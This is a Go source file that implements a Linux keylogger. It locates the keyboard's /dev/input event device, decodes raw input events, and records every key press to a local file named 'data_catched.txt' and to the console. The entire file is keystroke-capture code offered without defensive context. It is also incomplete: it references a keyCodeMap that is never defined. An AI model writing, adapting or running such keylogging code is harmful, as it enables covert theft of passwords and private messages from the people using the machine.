package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

type EventType uint16

type InputEvent struct {
	Time  syscall.Timeval
	Type  EventType
	Code  uint16
	Value int32
}

func main() {
	log.SetFlags(log.Lshortfile)

	f, err := os.OpenFile("data_catched.txt", os.O_RDWR|os.O_TRUNC|os.O_CREATE, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	keyobardPath, err := findKeyboardDevice()
	if err != nil {
		log.Fatal(err)
	}

	k, err := os.OpenFile(keyobardPath, os.O_RDONLY, os.ModeCharDevice)
	if err != nil {
		log.Fatal(err)
	}

	defer k.Close()

	for {
		buffer := make([]byte, unsafe.Sizeof(InputEvent{}))

		_, err = k.Read(buffer)
		if err != nil {
			break
		}

		event := &InputEvent{}
		err = binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
		if err != nil {
			log.Fatal(err)
		}

		if event.Value < 2 {
			f.Write([]byte(keyCodeMap[event.Code]))
			fmt.Printf("%v\n", keyCodeMap[event.Code])
		}

	}
}

func findKeyboardDevice() (string, error) {
	var deviceName string
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 20; i++ {
		b, _ := ioutil.ReadFile(fmt.Sprintf(path, i))

		deviceName = strings.ToLower(string(b))
		if strings.Contains(deviceName, "keyboard") {
			return fmt.Sprintf(resolved, i), nil
		}
	}
	if deviceName == "" {
		return "", errors.New("keyboard not found")
	}
	return deviceName, nil
}
